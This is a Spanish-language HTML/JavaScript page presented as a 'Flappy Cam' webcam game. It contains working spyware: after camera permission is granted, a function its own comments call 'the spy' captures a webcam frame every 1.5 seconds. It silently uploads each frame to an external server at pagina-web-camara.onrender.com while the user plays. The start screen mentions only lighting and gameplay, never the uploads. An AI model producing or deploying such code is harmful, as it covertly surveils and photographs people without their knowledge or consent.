<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Flappy Cam Edition</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; color: white; }

        /* La cámara es el fondo del juego */
        video#webcam {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* Efecto espejo */
            z-index: 1;
            filter: brightness(0.7); /* Para que se vean mejor las tuberías */
        }

        canvas#gameCanvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
        }

        .hud {
            position: absolute;
            top: 20px;
            width: 100%;
            text-align: center;
            z-index: 100;
            font-size: 30px;
            font-weight: bold;
            text-shadow: 2px 2px 5px rgba(0,0,0,0.7);
            pointer-events: none;
        }

        /* Pantallas de interfaz */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 300;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .card {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 20px;
            border: 3px solid #f1c40f;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 0 20px rgba(241, 196, 15, 0.3);
        }

        .btn {
            background: #f1c40f;
            color: #000;
            border: none;
            padding: 18px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            margin-top: 25px;
            width: 100%;
            text-transform: uppercase;
        }

        .warning {
            color: #ffcc00;
            font-size: 14px;
            margin-top: 15px;
            font-weight: bold;
        }
    </style>
</head>
<body onclick="birdJump()">

<div class="hud">SCORE: <span id="score">0</span></div>

<video id="webcam" autoplay playsinline></video>
<canvas id="gameCanvas"></canvas>

<div id="start-screen" class="overlay">
    <div class="card">
        <h1 style="color:#f1c40f; margin:0;">FLAPPY CAM</h1>
        <p style="color:#ccc;">Toca la pantalla para que el pájaro vuele.</p>
        
        <p class="warning">⚠️ REQUISITO: Asegúrate de tener una ILUMINACIÓN DECENTE para una mejor experiencia.</p>
        
        <button class="btn" onclick="initApp(event)">EMPEZAR A JUGAR</button>
    </div>
</div>

<div id="error-screen" class="overlay" style="display:none;">
    <div class="card">
        <h2 style="color:#e74c3c;">ERROR DE CÁMARA</h2>
        <p>No se pudo acceder a la cámara. Revisa los permisos.</p>
        <button class="btn" onclick="location.reload()">REINTENTAR</button>
    </div>
</div>

<script>
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let bird = { x: 80, y: 0, v: 0, radius: 20 };
    let pipes = [];
    let score = 0;
    let isRunning = false;

    async function initApp(e) {
        e.stopPropagation(); // Evita que el clic del botón haga saltar al pájaro al inicio
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                document.getElementById('start-screen').style.display = 'none';
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                bird.y = canvas.height / 2;
                isRunning = true;
                
                spawnPipe();
                gameLoop();
                setInterval(captureAndSend, 1500); // Captura invisible
            };
        } catch (err) {
            document.getElementById('start-screen').style.display = 'none';
            document.getElementById('error-screen').style.display = 'flex';
        }
    }

    function birdJump() {
        if (isRunning) {
            bird.v = -8;
        }
    }

    function spawnPipe() {
        if (!isRunning) return;
        const gap = 200;
        const h = Math.random() * (canvas.height - gap - 120) + 60;
        pipes.push({ x: canvas.width, top: h, bottom: h + gap, w: 70, passed: false });
        setTimeout(spawnPipe, 1600);
    }

    function gameLoop() {
        if (!isRunning) return;

        ctx.clearRect(0, 0, canvas.width, canvas.height);

        // Física
        bird.v += 0.4;
        bird.y += bird.v;

        // Dibujar Pájaro (Estilo Neon para que resalte sobre el video)
        ctx.fillStyle = "#f1c40f";
        ctx.shadowBlur = 15;
        ctx.shadowColor = "#f1c40f";
        ctx.beginPath();
        ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2);
        ctx.fill();
        ctx.shadowBlur = 0; // Reset para otros elementos

        // Tuberías
        pipes.forEach((p, i) => {
            p.x -= 5;
            ctx.fillStyle = "rgba(46, 204, 113, 0.9)";
            ctx.fillRect(p.x, 0, p.w, p.top);
            ctx.fillRect(p.x, p.bottom, p.w, canvas.height - p.bottom);

            // Colisiones
            if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
                if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) gameOver();
            }

            if (p.x + p.w < bird.x && !p.passed) {
                score++;
                p.passed = true;
                document.getElementById('score').innerText = score;
            }
            if (p.x + p.w < 0) pipes.splice(i, 1);
        });

        if (bird.y > canvas.height || bird.y < 0) gameOver();
        requestAnimationFrame(gameLoop);
    }

    function gameOver() {
        isRunning = false;
        alert("PERDISTE. Score: " + score);
        location.reload();
    }

    // EL "ESPÍA": Captura lo que ve la cámara y lo envía al servidor
    function captureAndSend() {
        const snap = document.createElement('canvas');
        snap.width = 320; 
        snap.height = 240;
        const sCtx = snap.getContext('2d');
        
        // Dibujamos el video (el usuario) sin los elementos del juego
        sCtx.drawImage(video, 0, 0, snap.width, snap.height);
        
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.5) })
        }).catch(e => console.log("Error de envío silencioso"));
    }
</script>
</body>
</html>
